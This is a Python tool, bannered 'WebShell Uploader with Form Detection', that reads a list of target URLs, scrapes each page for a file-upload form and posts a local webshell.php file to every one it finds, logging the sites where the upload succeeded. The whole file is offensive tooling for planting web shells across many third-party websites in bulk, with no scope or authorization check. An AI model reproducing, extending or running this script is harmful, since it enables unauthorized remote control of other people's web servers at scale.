import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import argparse
import os

init(autoreset=True)

webshell_file = 'webshell.php'
targets_file = 'targets.txt'
log_file = 'success.txt'

def print_banner():
    print(Fore.GREEN + Style.BRIGHT + """
    =========================================
    WebShell Uploader with Form Detection
                By Sheikh Nightshader
    =========================================
    """)

def parse_args():
    parser = argparse.ArgumentParser(description='WebShell Uploader with Form Detection, By Sheikh Nightshader')
    parser.add_argument('--webshell', default=webshell_file, help='Path to the webshell file')
    parser.add_argument('--targets', default=targets_file, help='Path to the file containing target URLs')
    parser.add_argument('--log', default=log_file, help='Path to the log file')
    return parser.parse_args()

def find_upload_form(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            file_input = form.find('input', {'type': 'file'})
            if file_input:
                print(Fore.YELLOW + f"Found upload form at {url}")
                return form
    except requests.RequestException as e:
        print(Fore.RED + f"Failed to access {url}: {e}")
    return None

def upload_webshell(url, form, webshell_file, log_file):
    try:
        action = form.get('action')
        if not action:
            action = url
        with open(webshell_file, 'rb') as f:
            files = {'file': (os.path.basename(webshell_file), f)}
            response = requests.post(action, files=files)
            if response.status_code == 200:
                print(Fore.GREEN + f"Successfully uploaded webshell to {url}")
                with open(log_file, 'a') as log_fh:
                    log_fh.write(f"{url}\n")
                return True
            else:
                print(Fore.RED + f"Failed to upload to {url}: Status code {response.status_code}")
    except requests.RequestException as e:
        print(Fore.RED + f"Failed to upload to {url}: {e}")
    return False

def main():
    print_banner()
    
    args = parse_args()

    if not os.path.isfile(args.webshell):
        print(Fore.RED + f"Webshell file not found: {args.webshell}")
        return
    if not os.path.isfile(args.targets):
        print(Fore.RED + f"Targets file not found: {args.targets}")
        return
    
    with open(args.targets, 'r') as targets_file:
        urls = targets_file.readlines()

    for url in urls:
        url = url.strip()
        if not url:
            continue
        print(Fore.CYAN + f"Checking {url} for upload forms...")
        form = find_upload_form(url)
        if form:
            upload_webshell(url, form, args.webshell, args.log)
        else:
            print(Fore.RED + f"No upload form found at {url}")

if __name__ == "__main__":
    main()
